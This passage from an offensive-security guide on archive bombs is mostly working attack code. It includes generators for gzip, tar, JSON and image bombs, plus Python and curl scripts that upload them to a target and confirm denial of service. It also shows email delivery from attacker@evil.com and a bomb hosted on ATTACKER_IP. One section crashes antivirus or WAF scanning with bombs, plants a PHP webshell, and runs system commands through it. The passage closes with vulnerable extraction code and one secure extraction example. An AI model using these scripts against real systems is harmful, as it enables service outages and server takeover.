  d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
  e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
  f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
  g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
  h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
  EOF
  # 9^8 = ~43 million items

  # ══════════════════════════════════════
  # JSON Bomb — Deeply nested structures
  # ══════════════════════════════════════

  python3 -c "
  import json

  # Method 1: Deep nesting
  depth = 100000
  bomb = 'x'
  for _ in range(depth):
      bomb = [bomb]
  json.dump(bomb, open('json_bomb_nested.json', 'w'))
  print(f'[+] json_bomb_nested.json — depth {depth}')

  # Method 2: Wide object
  bomb = {}
  for i in range(100000):
      bomb[f'key_{i}'] = 'A' * 10000
  json.dump(bomb, open('json_bomb_wide.json', 'w'))
  import os
  print(f'[+] json_bomb_wide.json — {os.path.getsize(\"json_bomb_wide.json\")/1024/1024:.0f} MB')
  "

  # ══════════════════════════════════════
  # Image Bomb (Pixel Flood)
  # ══════════════════════════════════════

  python3 -c "
  from PIL import Image
  # Create image with extreme dimensions
  # 100000 x 100000 pixels = 10 billion pixels = ~30 GB uncompressed RAM
  # But as PNG, it compresses to tiny size with solid color
  
  # WARNING: Even creating this may use lots of RAM
  # Use smaller dimensions for PoC
  img = Image.new('RGB', (10000, 10000), color='white')
  img.save('pixel_flood_poc.png', 'PNG', compress_level=9)
  import os
  print(f'[+] pixel_flood_poc.png — {os.path.getsize(\"pixel_flood_poc.png\"):,} bytes')
  print(f'    Dimensions: 10000x10000 = 100M pixels')
  print(f'    Uncompressed RAM: ~300 MB')
  " 2>/dev/null

  # Extreme pixel flood (careful!)
  # python3 -c "
  # from PIL import Image
  # img = Image.new('RGB', (100000, 100000), 'white')
  # img.save('pixel_flood_extreme.png', 'PNG')
  # "
  # This would require ~30 GB RAM just to create

  echo "[+] All format bombs generated"
  ```
  :::
::

### Specialized Bomb Types

::code-group
```bash [GZIP Bomb]
# ══════════════════════════════════════
# GZIP Bomb — Single compressed stream
# ══════════════════════════════════════

# 1 GB GZIP bomb
dd if=/dev/zero bs=1M count=1024 2>/dev/null | gzip -9 > gzip_bomb_1gb.gz
echo "[+] gzip_bomb_1gb.gz: $(ls -lh gzip_bomb_1gb.gz | awk '{print $5}')"

# 10 GB GZIP bomb
dd if=/dev/zero bs=1M count=10240 2>/dev/null | gzip -9 > gzip_bomb_10gb.gz
echo "[+] gzip_bomb_10gb.gz: $(ls -lh gzip_bomb_10gb.gz | awk '{print $5}')"

# Python GZIP bomb (controlled)
python3 -c "
import gzip
size_mb = 500
data = b'\x00' * (size_mb * 1024 * 1024)
with gzip.open('gzip_bomb_500mb.gz', 'wb', compresslevel=9) as f:
    f.write(data)
import os
print(f'[+] gzip_bomb_500mb.gz: {os.path.getsize(\"gzip_bomb_500mb.gz\"):,} bytes')
print(f'    Expands to: {size_mb} MB')
"

# Concatenated GZIP bomb (multiple streams)
# GZIP allows concatenation — decompressors process all streams
for i in $(seq 1 10); do
    dd if=/dev/zero bs=1M count=100 2>/dev/null | gzip -9
done > gzip_concat_bomb.gz
echo "[+] gzip_concat_bomb.gz: $(ls -lh gzip_concat_bomb.gz | awk '{print $5}') → 1 GB expanded"
```

```bash [TAR Bomb]
# ══════════════════════════════════════
# TAR Bomb — Various TAR-specific attacks
# ══════════════════════════════════════

# Massive file in TAR
dd if=/dev/zero of=/tmp/tar_payload.bin bs=1M count=500 2>/dev/null
tar czf tar_bomb_500mb.tar.gz -C /tmp tar_payload.bin
echo "[+] tar_bomb_500mb.tar.gz: $(ls -lh tar_bomb_500mb.tar.gz | awk '{print $5}')"
rm /tmp/tar_payload.bin

# TAR with millions of empty files (inode exhaustion)
python3 -c "
import tarfile
import io

with tarfile.open('tar_inode_bomb.tar.gz', 'w:gz') as tf:
    for i in range(100000):
        info = tarfile.TarInfo(name=f'dir_{i//1000}/file_{i}.txt')
        info.size = 0
        tf.addfile(info)
print('[+] tar_inode_bomb.tar.gz — 100,000 empty files')
"

# TAR with extremely long filenames (path exhaustion)
python3 -c "
import tarfile
import io

with tarfile.open('tar_longpath_bomb.tar.gz', 'w:gz') as tf:
    for i in range(1000):
        long_name = '/'.join(['a' * 200] * 50) + f'/file_{i}.txt'
        info = tarfile.TarInfo(name=long_name[:10000])
        info.size = 1
        tf.addfile(info, io.BytesIO(b'x'))
print('[+] tar_longpath_bomb.tar.gz — extremely long paths')
"

# TAR with sparse file entries (claims huge size)
python3 -c "
import tarfile
import io
import struct

with tarfile.open('tar_sparse_bomb.tar.gz', 'w:gz') as tf:
    info = tarfile.TarInfo(name='sparse_file.bin')
    info.size = 10 * 1024 * 1024 * 1024  # Claims 10 GB
    info.type = tarfile.REGTYPE
    # Only write 1 byte of actual data
    tf.addfile(info, io.BytesIO(b'\x00'))
print('[+] tar_sparse_bomb.tar.gz — claims 10 GB, actual ~0 bytes')
"
```

```python [Multi-Format Bomb Generator]
#!/usr/bin/env python3
"""Generate archive bombs in multiple formats"""
import zipfile
import tarfile
import gzip
import bz2
import lzma
import io
import os

def generate_all_bombs(size_mb=100, output_dir="bombs"):
    """Generate controlled bombs in all supported formats"""
    os.makedirs(output_dir, exist_ok=True)

    data = b'\x00' * (size_mb * 1024 * 1024)
    print(f"[*] Generating {size_mb} MB bombs in all formats...\n")

    # ZIP
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.zip')
    with zipfile.ZipFile(path, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        zf.writestr('data.bin', data)
    print(f"[+] ZIP:  {os.path.getsize(path):>10,} bytes → {path}")

    # TAR.GZ
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.tar.gz')
    with tarfile.open(path, 'w:gz') as tf:
        info = tarfile.TarInfo('data.bin')
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    print(f"[+] TGZ:  {os.path.getsize(path):>10,} bytes → {path}")

    # TAR.BZ2
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.tar.bz2')
    with tarfile.open(path, 'w:bz2') as tf:
        info = tarfile.TarInfo('data.bin')
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    print(f"[+] TBZ2: {os.path.getsize(path):>10,} bytes → {path}")

    # TAR.XZ
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.tar.xz')
    with tarfile.open(path, 'w:xz') as tf:
        info = tarfile.TarInfo('data.bin')
        info.size = len(data)
        tf.addfile(info, io.BytesIO(data))
    print(f"[+] TXZ:  {os.path.getsize(path):>10,} bytes → {path}")

    # GZIP
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.gz')
    with gzip.open(path, 'wb', compresslevel=9) as f:
        f.write(data)
    print(f"[+] GZ:   {os.path.getsize(path):>10,} bytes → {path}")

    # BZ2
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.bz2')
    with bz2.open(path, 'wb', compresslevel=9) as f:
        f.write(data)
    print(f"[+] BZ2:  {os.path.getsize(path):>10,} bytes → {path}")

    # XZ/LZMA
    path = os.path.join(output_dir, f'bomb_{size_mb}mb.xz')
    with lzma.open(path, 'wb', preset=9) as f:
        f.write(data)
    print(f"[+] XZ:   {os.path.getsize(path):>10,} bytes → {path}")

    print(f"\n[+] All {size_mb} MB bombs generated in {output_dir}/")

generate_all_bombs(100, "bombs_100mb")
generate_all_bombs(1000, "bombs_1gb")
```
::

---

## Delivery & Exploitation

### Upload & Impact Verification

::tabs
  :::tabs-item{icon="i-lucide-upload" label="cURL Upload & Monitor"}
  ```bash
  # ══════════════════════════════════════
  # Upload bombs and monitor server impact
  # ══════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  FIELD="file"

  # ── Step 1: Establish baseline ──
  echo "[*] Establishing baseline response time..."
  for i in $(seq 1 5); do
      TIME=$(curl -s -o /dev/null -w "%{time_total}" "https://target.com/" 2>/dev/null)
      echo "    Baseline ${i}: ${TIME}s"
  done

  # ── Step 2: Upload graduated bombs ──
  echo ""
  echo "[*] Starting graduated bomb upload..."

  # Safe PoC (10 MB expanded)
  python3 -c "
  import zipfile
  with zipfile.ZipFile('/tmp/bomb_10mb.zip','w',zipfile.ZIP_DEFLATED,compresslevel=9) as z:
      z.writestr('data.bin', b'\x00' * (10*1024*1024))
  "

  echo "[*] Uploading 10 MB bomb..."
  START=$(date +%s%N)
  RESP=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}|%{size_download}" \
    --max-time 120 -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/bomb_10mb.zip;type=application/zip" \
    -H "Cookie: $COOKIE")
  END=$(date +%s%N)

  STATUS=$(echo "$RESP" | cut -d'|' -f1)
  TOTAL_TIME=$(echo "$RESP" | cut -d'|' -f2)
  echo "    Status: ${STATUS}, Time: ${TOTAL_TIME}s"

  # Check server health after upload
  sleep 2
  HEALTH_TIME=$(curl -s -o /dev/null -w "%{time_total}" "https://target.com/" 2>/dev/null)
  echo "    Post-upload response time: ${HEALTH_TIME}s"

  # ── Step 3: Monitor impact indicators ──
  echo ""
  echo "[*] Impact indicators to check:"
  echo "    - Response time increase (baseline vs post-upload)"
  echo "    - HTTP 500/502/503 errors"
  echo "    - Connection timeouts"
  echo "    - Server completely unresponsive"
  echo ""

  # Continuous health monitoring
  echo "[*] Monitoring server health for 60 seconds..."
  for i in $(seq 1 30); do
      HEALTH=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}" \
        --max-time 10 "https://target.com/" 2>/dev/null)
      H_STATUS=$(echo "$HEALTH" | cut -d'|' -f1)
      H_TIME=$(echo "$HEALTH" | cut -d'|' -f2)
      echo "    [${i}] Status: ${H_STATUS}, Time: ${H_TIME}s"

      if [ "$H_STATUS" = "000" ]; then
          echo "    [!!!] SERVER UNRESPONSIVE — DoS confirmed!"
      elif [ "$H_STATUS" = "500" ] || [ "$H_STATUS" = "502" ] || [ "$H_STATUS" = "503" ]; then
          echo "    [!!!] SERVER ERROR — Impact confirmed!"
      fi

      sleep 2
  done

  rm -f /tmp/bomb_10mb.zip
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Python Automated Exploit"}
  ```python [archive_bomb_exploit.py]
  #!/usr/bin/env python3
  """
  Archive Bomb Upload Exploit
  Graduated testing with impact monitoring
  """
  import requests
  import zipfile
  import io
  import time
  import sys
  import urllib3
  urllib3.disable_warnings()

  class ArchiveBombExploit:
      def __init__(self, upload_url, field="file", cookies=None):
          self.upload_url = upload_url
          self.field = field
          self.session = requests.Session()
          self.session.verify = False
          self.session.timeout = 120
          if cookies:
              self.session.cookies.update(cookies)
          self.base_url = upload_url.rsplit('/', 2)[0]
          self.baseline_time = None

      def measure_baseline(self, samples=5):
          """Measure normal server response time"""
          times = []
          for _ in range(samples):
              try:
                  start = time.time()
                  self.session.get(self.base_url, timeout=10)
                  times.append(time.time() - start)
              except:
                  times.append(10.0)
              time.sleep(0.5)

          self.baseline_time = sum(times) / len(times)
          print(f"[*] Baseline response time: {self.baseline_time:.3f}s")
          return self.baseline_time

      def create_zip_bomb(self, size_mb):
          """Create ZIP bomb in memory"""
          buf = io.BytesIO()
          with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
              data = b'\x00' * (size_mb * 1024 * 1024)
              zf.writestr('data.bin', data)
          buf.seek(0)
          return buf

      def create_file_count_bomb(self, num_files):
          """Create ZIP with many small files"""
          buf = io.BytesIO()
          with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
              for i in range(num_files):
                  zf.writestr(f'd{i//1000}/f{i}.txt', b'\x00' * 100)
          buf.seek(0)
          return buf

      def upload_bomb(self, bomb_data, filename="bomb.zip", content_type="application/zip"):
          """Upload the bomb and measure processing time"""
          files = {self.field: (filename, bomb_data, content_type)}
          try:
              start = time.time()
              r = self.session.post(self.upload_url, files=files, timeout=120)
              elapsed = time.time() - start
              return r.status_code, elapsed, r.text[:200]
          except requests.exceptions.Timeout:
              return 0, 120.0, "TIMEOUT"
          except requests.exceptions.ConnectionError:
              return 0, 0, "CONNECTION_REFUSED"
          except Exception as e:
              return 0, 0, str(e)

      def check_health(self):
          """Check if server is still responsive"""
          try:
              start = time.time()
              r = self.session.get(self.base_url, timeout=10)
              elapsed = time.time() - start
              return r.status_code, elapsed
          except:
              return 0, 10.0

      def graduated_test(self):
          """Run graduated bomb testing"""
          print(f"\n{'='*60}")
          print(f" Archive Bomb Upload — Graduated Testing")
          print(f"{'='*60}")
          print(f"[*] Target: {self.upload_url}")

          self.measure_baseline()

          levels = [
              ("ZIP — 10 MB expanded", lambda: self.create_zip_bomb(10)),
              ("ZIP — 50 MB expanded", lambda: self.create_zip_bomb(50)),
              ("ZIP — 100 MB expanded", lambda: self.create_zip_bomb(100)),
              ("ZIP — 500 MB expanded", lambda: self.create_zip_bomb(500)),
              ("ZIP — 1 GB expanded", lambda: self.create_zip_bomb(1024)),
              ("ZIP — 10K files", lambda: self.create_file_count_bomb(10000)),
              ("ZIP — 50K files", lambda: self.create_file_count_bomb(50000)),
          ]

          for desc, bomb_factory in levels:
              print(f"\n--- {desc} ---")

              bomb = bomb_factory()
              bomb_size = bomb.getbuffer().nbytes
              print(f"    Compressed: {bomb_size:,} bytes")

              status, elapsed, resp = self.upload_bomb(bomb)
              print(f"    Upload status: {status}, Time: {elapsed:.1f}s")

              if status == 0:
                  print(f"    [!!!] SERVER FAILED: {resp}")
                  health_status, health_time = self.check_health()
                  if health_status == 0:
                      print(f"    [!!!] SERVER DOWN — DoS CONFIRMED!")
                      return True
                  else:
                      print(f"    [*] Server recovered (status={health_status}, time={health_time:.1f}s)")

              elif elapsed > self.baseline_time * 10:
                  print(f"    [+] SIGNIFICANT SLOWDOWN: {elapsed:.1f}s vs baseline {self.baseline_time:.3f}s")
                  print(f"    [+] Ratio: {elapsed/self.baseline_time:.0f}x slower")

              # Health check
              time.sleep(2)
              h_status, h_time = self.check_health()
              print(f"    Post-upload health: status={h_status}, time={h_time:.2f}s")

              if h_status in [500, 502, 503]:
                  print(f"    [!!!] SERVER ERROR — Impact confirmed!")

              if h_time > self.baseline_time * 5:
                  print(f"    [+] DEGRADATION: {h_time/self.baseline_time:.0f}x slower than baseline")

              time.sleep(3)

          print(f"\n{'='*60}")
          print(f" Testing Complete")
          print(f"{'='*60}")

  if __name__ == "__main__":
      exploit = ArchiveBombExploit(
          upload_url="https://target.com/api/upload",
          field="file",
          cookies={"session": "AUTH_TOKEN"},
      )
      exploit.graduated_test()
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Burp Suite Approach"}
  ```text
  # ═══ Burp Suite — Archive Bomb Testing ═══

  # 1. PROXY — Capture normal archive upload request
  # 2. Send to REPEATER

  # 3. In Repeater:
  #    a. Replace uploaded file with graduated ZIP bombs
  #    b. Monitor response time in bottom bar
  #    c. Check response for error messages

  # 4. Compare processing times:
  #    Normal ZIP (1 KB):   ~200ms
  #    Bomb (10 MB exp):    ~2000ms    (10x slower = likely extracting)
  #    Bomb (100 MB exp):   ~15000ms   (75x slower = confirmed)
  #    Bomb (1 GB exp):     TIMEOUT    (DoS confirmed)

  # 5. Watch for indicators in response:
  #    - "out of memory"
  #    - "disk full"
  #    - "extraction failed"
  #    - HTTP 500/502/503
  #    - Connection reset
  #    - Timeout

  # 6. Monitor server health in parallel:
  #    Open browser tab to target homepage
  #    Check if it becomes slow/unresponsive during upload

  # 7. Turbo Intruder for rapid testing:
  #    - Send multiple bombs simultaneously
  #    - Check if concurrent processing amplifies impact

  # 8. Generate bombs inline with Burp Extension:
  #    Use "Upload Scanner" extension
  #    Enable "Decompression bomb" test case
  ```
  :::
::

### Different Upload Vectors

::code-group
```bash [Direct File Upload]
# ── Standard multipart form upload ──
curl -X POST https://target.com/api/upload \
  -F "file=@bomb_100mb.zip;type=application/zip" \
  -H "Cookie: session=TOKEN" \
  --max-time 120

# ── With different Content-Types ──
for ct in "application/zip" "application/x-zip-compressed" \
          "application/octet-stream" "application/gzip" \
          "application/x-tar" "application/x-bzip2" \
          "application/x-xz" "application/x-7z-compressed"; do
    curl -s -o /dev/null -w "[%{http_code}] CT: ${ct}\n" \
      -X POST https://target.com/api/upload \
      -F "file=@bomb_100mb.zip;type=${ct}" \
      -H "Cookie: session=TOKEN" --max-time 60
done
```

```bash [Base64 / JSON Upload]
# ── Base64 encoded in JSON body ──
BASE64_BOMB=$(base64 -w0 bomb_100mb.zip)
curl -X POST https://target.com/api/import \
  -H "Content-Type: application/json" \
  -H "Cookie: session=TOKEN" \
  -d "{\"filename\":\"data.zip\",\"content\":\"${BASE64_BOMB}\"}" \
  --max-time 120

# ── As URL parameter (for GET-based importers) ──
# Host bomb on attacker server
python3 -m http.server 8080 &
curl "https://target.com/api/import?url=http://ATTACKER_IP:8080/bomb_100mb.zip" \
  -H "Cookie: session=TOKEN"
```

```bash [Email Attachment Vector]
# ── Send archive bomb as email attachment ──
# Targets: webmail applications, email parsers, AV on mail servers

swaks --to victim@target.com \
  --from attacker@evil.com \
  --server target.com \
  --attach bomb_100mb.zip \
  --header "Subject: Important Data" \
  --body "Please review the attached data."

# ── With OOXML bomb as "document" ──
swaks --to victim@target.com \
  --from attacker@evil.com \
  --server target.com \
  --attach docx_bomb_medium.docx \
  --header "Subject: Quarterly Report" \
  --body "Please find the report attached."
```

```bash [Document Processor Vector]
# ── Upload bombs disguised as documents ──

# DOCX bomb (resume parser)
curl -X POST "https://target.com/careers/apply" \
  -F "resume=@docx_bomb_medium.docx;type=application/vnd.openxmlformats-officedocument.wordprocessingml.document" \
  -F "name=John Doe" \
  -H "Cookie: session=TOKEN"

# XLSX bomb (data import)
curl -X POST "https://target.com/api/data/import" \
  -F "spreadsheet=@xlsx_bomb_medium.xlsx;type=application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" \
  -H "Cookie: session=TOKEN"

# SVG bomb (image upload)
curl -X POST "https://target.com/api/upload" \
  -F "image=@svg_bomb.svg;type=image/svg+xml" \
  -H "Cookie: session=TOKEN"

# YAML bomb (config import)
curl -X POST "https://target.com/api/config/import" \
  -H "Content-Type: application/x-yaml" \
  -H "Cookie: session=TOKEN" \
  -d @yaml_bomb.yml
```
::

---

## AV / WAF Bypass via Archive Bombs

::caution
Archive bombs can be used to crash antivirus scanners and WAFs that inspect uploaded file contents. When the security layer crashes, subsequent malicious uploads pass through unscanned.
::

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="AV Bypass Strategy"}
  ```bash
  # ══════════════════════════════════════
  # Strategy: Crash AV with bomb → upload malware while AV is down
  # ══════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Step 1: Upload archive bomb to crash AV scanner
  echo "[*] Step 1: Sending archive bomb to crash AV..."
  python3 -c "
  import zipfile
  with zipfile.ZipFile('/tmp/av_bomb.zip','w',zipfile.ZIP_DEFLATED,compresslevel=9) as z:
      z.writestr('payload.bin', b'\x00' * (500*1024*1024))
  "

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/av_bomb.zip;type=application/zip" \
    -H "Cookie: $COOKIE" --max-time 120 &
  BOMB_PID=$!

  # Step 2: Wait for AV to start processing
  sleep 5

  # Step 3: While AV is busy/crashed, upload actual malware
  echo "[*] Step 2: Uploading webshell while AV is processing bomb..."
  echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

  # Upload webshell — AV may be too busy to scan it
  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/shell.php;filename=shell.php;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # Step 4: Verify shell
  sleep 2
  curl -s "https://target.com/uploads/shell.php?cmd=id"

  wait $BOMB_PID 2>/dev/null
  rm -f /tmp/av_bomb.zip /tmp/shell.php
  ```
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="WAF Bypass Strategy"}
  ```bash
  # ══════════════════════════════════════
  # Strategy: Overwhelm WAF content inspection with bomb
  # ══════════════════════════════════════

  # Some WAFs decompress and inspect archive contents
  # A bomb can exhaust WAF resources, causing it to fail open

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # Method 1: Concurrent bomb uploads to exhaust WAF
  echo "[*] Sending concurrent bombs to exhaust WAF..."
  for i in $(seq 1 10); do
      python3 -c "
  import zipfile
  with zipfile.ZipFile('/tmp/waf_bomb_${i}.zip','w',zipfile.ZIP_DEFLATED,9) as z:
      z.writestr('p.bin', b'\x00' * (100*1024*1024))
  "
      curl -s -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/waf_bomb_${i}.zip;type=application/zip" \
        -H "Cookie: $COOKIE" --max-time 60 &
  done

  # Wait a moment then send actual payload
  sleep 3
  echo "[*] Sending payload while WAF is overwhelmed..."
  curl -X POST "$UPLOAD_URL" \
    -F "file=@shell.php;filename=shell.php" \
    -H "Cookie: $COOKIE"

  wait
  rm -f /tmp/waf_bomb_*.zip

  # Method 2: Nested bomb that times out WAF analysis
  echo "[*] Creating timeout bomb..."
  python3 -c "
  import zipfile, io
  # Create deeply nested ZIP (forces recursive analysis)
  data = b'\x00' * (10*1024*1024)
  buf = io.BytesIO()
  with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, 9) as z:
      z.writestr('inner.bin', data)
  inner = buf.getvalue()

  for layer in range(10):
      buf2 = io.BytesIO()
      with zipfile.ZipFile(buf2, 'w', zipfile.ZIP_DEFLATED, 9) as z:
          for j in range(5):
              z.writestr(f'layer{layer}_{j}.zip', inner)
      inner = buf2.getvalue()

  open('/tmp/nested_timeout.zip','wb').write(inner)
  "

  curl -X POST "$UPLOAD_URL" \
    -F "file=@/tmp/nested_timeout.zip;type=application/zip" \
    -H "Cookie: $COOKIE" --max-time 300

  rm -f /tmp/nested_timeout.zip
  ```
  :::
::

---

## Impact Verification & Monitoring

::tabs
  :::tabs-item{icon="i-lucide-activity" label="Server Health Monitoring"}
  ```bash
  #!/bin/bash
  # monitor_impact.sh — Monitor server during bomb upload

  TARGET="$1"
  INTERVAL="${2:-2}"
  DURATION="${3:-120}"

  if [ -z "$TARGET" ]; then
      echo "Usage: $0 <target_url> [interval_sec] [duration_sec]"
      exit 1
  fi

  echo "═══ Server Impact Monitor ═══"
  echo "Target: $TARGET"
  echo "Interval: ${INTERVAL}s"
  echo "Duration: ${DURATION}s"
  echo ""
  echo "Time       Status  Response_Time  Size"
  echo "─────────  ──────  ─────────────  ────"

  START=$(date +%s)
  while true; do
      ELAPSED=$(($(date +%s) - START))
      [ "$ELAPSED" -ge "$DURATION" ] && break

      RESULT=$(curl -s -o /dev/null -w "%{http_code}|%{time_total}|%{size_download}" \
        --max-time 10 "$TARGET" 2>/dev/null)

      STATUS=$(echo "$RESULT" | cut -d'|' -f1)
      RESP_TIME=$(echo "$RESULT" | cut -d'|' -f2)
      SIZE=$(echo "$RESULT" | cut -d'|' -f3)

      [ "$STATUS" = "000" ] && STATUS="DOWN"

      ALERT=""
      [ "$STATUS" = "DOWN" ] && ALERT=" ← SERVER DOWN!"
      [ "$STATUS" = "500" ] || [ "$STATUS" = "502" ] || [ "$STATUS" = "503" ] && ALERT=" ← ERROR!"

      printf "%3ds        %-6s  %-13s  %s%s\n" "$ELAPSED" "$STATUS" "${RESP_TIME}s" "$SIZE" "$ALERT"

      sleep "$INTERVAL"
  done

  echo ""
  echo "[*] Monitoring complete"
  ```
  :::

  :::tabs-item{icon="i-lucide-activity" label="Resource Monitoring (If Shell Access)"}
  ```bash
  # ── If you have shell access, monitor server resources ──

  SHELL_URL="https://target.com/shell.php"

  # CPU usage
  curl -s "${SHELL_URL}?cmd=top+-bn1+|+head+-20"

  # Memory usage
  curl -s "${SHELL_URL}?cmd=free+-h"

  # Disk usage
  curl -s "${SHELL_URL}?cmd=df+-h"

  # Inode usage
  curl -s "${SHELL_URL}?cmd=df+-i"

  # Process list (look for extraction processes)
  curl -s "${SHELL_URL}" --data-urlencode "cmd=ps aux | grep -iE 'unzip|tar|gzip|7z|extract|decompress' | grep -v grep"

  # IO wait
  curl -s "${SHELL_URL}" --data-urlencode "cmd=iostat -x 1 3 2>/dev/null || vmstat 1 3"

  # Load average
  curl -s "${SHELL_URL}?cmd=cat+/proc/loadavg"

  # OOM killer logs
  curl -s "${SHELL_URL}" --data-urlencode "cmd=dmesg | grep -i 'oom\|out of memory\|killed process' | tail -20"

  # Disk space in upload directory
  curl -s "${SHELL_URL}" --data-urlencode "cmd=du -sh /var/www/html/uploads/ 2>/dev/null"
  ```
  :::
::

---

## Vulnerable Code Patterns

::code-tree{default-value="python_vulnerable.py"}
```python [python_vulnerable.py]
# VULNERABLE — No extraction size limit
import zipfile

def handle_upload(uploaded_file):
    extract_dir = "/app/uploads/extracted"

    # VULNERABLE: No check on decompressed size
    with zipfile.ZipFile(uploaded_file, 'r') as zf:
        zf.extractall(extract_dir)  # Extracts everything!

    return "Files extracted successfully"
```

```javascript [nodejs_vulnerable.js]
// VULNERABLE — No size check during extraction
const AdmZip = require('adm-zip');

app.post('/upload', (req, res) => {
    const zip = new AdmZip(req.file.buffer);

    // VULNERABLE: No decompressed size validation
    zip.extractAllTo('./uploads/extracted', true);

    res.json({ status: 'extracted' });
});
```

```php [php_vulnerable.php]
<?php
// VULNERABLE — No size limit check
$zip = new ZipArchive;
if ($zip->open($_FILES['file']['tmp_name']) === TRUE) {
    // VULNERABLE: Extracts without checking total size
    $zip->extractTo('/var/www/html/uploads/extracted');
    $zip->close();
    echo 'Extracted successfully';
}
?>
```

```java [Java_Vulnerable.java]
// VULNERABLE — No decompression ratio check
import java.util.zip.*;

public void extractZip(InputStream input, String destDir) throws IOException {
    ZipInputStream zis = new ZipInputStream(input);
    ZipEntry entry;

    // VULNERABLE: No total size tracking
    while ((entry = zis.getNextEntry()) != null) {
        File outFile = new File(destDir, entry.getName());
        FileOutputStream fos = new FileOutputStream(outFile);
        byte[] buffer = new byte[1024];
        int len;
        while ((len = zis.read(buffer)) > 0) {
            fos.write(buffer, 0, len);  // Writes unlimited data
        }
        fos.close();
    }
}
```

```go [go_vulnerable.go]
// VULNERABLE — No extraction size limit
package main

import (
    "archive/zip"
    "io"
    "os"
)

func extractZip(zipPath, destDir string) error {
    r, _ := zip.OpenReader(zipPath)
    defer r.Close()

    for _, f := range r.File {
        // VULNERABLE: No size check
        outFile, _ := os.Create(destDir + "/" + f.Name)
        rc, _ := f.Open()
        io.Copy(outFile, rc)  // Copies unlimited bytes
        rc.Close()
        outFile.Close()
    }
    return nil
}
```
::

### Secure Implementation

::code-collapse
```python [secure_extraction.py]
#!/usr/bin/env python3
"""Secure archive extraction with bomb protection"""
import zipfile
import tarfile
import os

# Configuration
MAX_TOTAL_SIZE = 100 * 1024 * 1024      # 100 MB max total extracted
MAX_FILE_SIZE = 50 * 1024 * 1024         # 50 MB max per file
MAX_FILE_COUNT = 1000                     # Max files in archive
MAX_COMPRESSION_RATIO = 100               # Max 100:1 ratio
MAX_NESTING_DEPTH = 3                     # Max nested archives
MAX_PATH_LENGTH = 255                     # Max filename length

class ArchiveBombError(Exception):
    pass

def safe_extract_zip(zip_path, extract_dir):
    """Safely extract ZIP with bomb detection"""
    extract_dir = os.path.realpath(extract_dir)

    with zipfile.ZipFile(zip_path, 'r') as zf:
        # Check file count
        entries = zf.infolist()
        if len(entries) > MAX_FILE_COUNT:
            raise ArchiveBombError(
                f"Too many files: {len(entries)} > {MAX_FILE_COUNT}")

        # Calculate total uncompressed size
        total_size = sum(e.file_size for e in entries)
        if total_size > MAX_TOTAL_SIZE:
            raise ArchiveBombError(
                f"Total size too large: {total_size} > {MAX_TOTAL_SIZE}")

        # Check compression ratio
        compressed_size = os.path.getsize(zip_path)
        if compressed_size > 0:
            ratio = total_size / compressed_size
            if ratio > MAX_COMPRESSION_RATIO:
                raise ArchiveBombError(
                    f"Suspicious compression ratio: {ratio:.0f}:1 > {MAX_COMPRESSION_RATIO}:1")

        # Extract with per-file checks
        extracted_total = 0
        for entry in entries:
            # Check individual file size
            if entry.file_size > MAX_FILE_SIZE:
                raise ArchiveBombError(
                    f"File too large: {entry.filename} ({entry.file_size} bytes)")

            # Check filename length
            if len(entry.filename) > MAX_PATH_LENGTH:
                raise ArchiveBombError(
                    f"Filename too long: {len(entry.filename)} chars")

            # Path traversal check
            dest_path = os.path.realpath(os.path.join(extract_dir, entry.filename))
            if not dest_path.startswith(extract_dir + os.sep):
                raise ArchiveBombError(
                    f"Path traversal: {entry.filename}")

            # Check for nested archives
            if entry.filename.lower().endswith(('.zip', '.tar', '.gz', '.bz2', '.xz', '.7z')):
                raise ArchiveBombError(
                    f"Nested archive detected: {entry.filename}")

            # Track running total
            extracted_total += entry.file_size
            if extracted_total > MAX_TOTAL_SIZE:
                raise ArchiveBombError(
                    f"Extraction size limit exceeded during extraction")

            zf.extract(entry, extract_dir)

    print(f"[+] Safely extracted {len(entries)} files ({extracted_total:,} bytes)")

def check_xml_bomb(xml_content, max_entity_expansions=10000):
    """Check for XML bomb (Billion Laughs) in content"""
    import re

    # Check for entity definitions
    entity_count = len(re.findall(r'<!ENTITY', xml_content, re.IGNORECASE))
    if entity_count > 10:
        raise ArchiveBombError(
            f"Suspicious entity count: {entity_count}")

    # Check for entity references
    ref_count = len(re.findall(r'&\w+;', xml_content))
    if ref_count > max_entity_expansions:
        raise ArchiveBombError(
            f"Too many entity references: {ref_count}")

    # Check for recursive entity patterns
    if re.search(r'<!ENTITY\s+\w+\s+"[^"]*&\w+;[^"]*&\w+;', xml_content):
        raise ArchiveBombError(
            "Recursive entity expansion pattern detected")

    return True
```
::

---

## Reporting & Remediation

### Bug Bounty Report Guidance

